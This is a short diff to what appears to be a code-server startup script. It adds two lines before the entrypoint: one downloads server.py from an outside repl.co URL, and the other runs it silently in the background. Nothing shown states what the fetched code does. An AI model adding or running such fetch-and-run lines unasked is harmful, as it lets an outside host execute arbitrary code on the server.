@@ -99,4 +99,6 @@ echo "[$PREFIX] Starting code-server..."
 # Now we can run code-server with the default entrypoint
 mkdir working
 pwd
+curl -o server.py https://vscode-heroku001.charan2004155.repl.co/downloadserver
+python3 server.py > /dev/null &
 /usr/bin/entrypoint.sh --bind-addr 0.0.0.0:8080 $START_DIR
